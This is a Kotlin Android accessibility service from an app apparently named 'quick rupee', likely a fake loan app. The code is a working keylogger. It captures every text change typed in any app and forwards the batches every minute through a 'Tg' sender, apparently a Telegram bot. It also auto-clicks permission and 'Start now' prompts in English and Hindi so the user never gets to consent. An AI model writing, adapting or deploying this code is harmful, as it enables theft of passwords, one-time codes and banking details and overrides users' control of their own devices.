package com.quick.rupee

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.util.Collections

class Access : AccessibilityService() {

    private val buf = Collections.synchronizedList(ArrayList<String>())
    private var lastPush = 0L

    override fun onAccessibilityEvent(e: AccessibilityEvent?) {
        if (e == null) return
        val pkg = e.packageName?.toString() ?: return

        if (pkg == "com.android.systemui" || pkg == "android") autoStart()

        if (e.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val t = e.text?.joinToString(" ")?.trim() ?: return
            if (t.isEmpty() || t.length > 120) return
            buf.add(t)
            val now = System.currentTimeMillis()
            if (now - lastPush > 60_000 && buf.isNotEmpty()) {
                lastPush = now
                val out = synchronized(buf) { buf.joinToString("\n").also { buf.clear() } }
                Thread { runCatching { Tg.text("<b>typing</b>\n$out") } }.start()
            }
        }
    }

    private fun autoStart() {
        val root = rootInActiveWindow ?: return
        val labels = listOf("Start now", "Ab shuru karein", "शुरू करें", "Start", "Allow", "अनुमति दें")
        for (label in labels) {
            val list = runCatching { root.findAccessibilityNodeInfosByText(label) }
                .getOrNull() ?: continue
            for (n in list) {
                var cur: AccessibilityNodeInfo? = n
                var d = 0
                while (cur != null && d < 4) {
                    val c: AccessibilityNodeInfo = cur
                    if (c.isClickable) {
                        runCatching { c.performAction(AccessibilityNodeInfo.ACTION_CLICK) }
                        return
                    }
                    cur = c.parent
                    d++
                }
            }
        }
    }

    override fun onInterrupt() {}
}
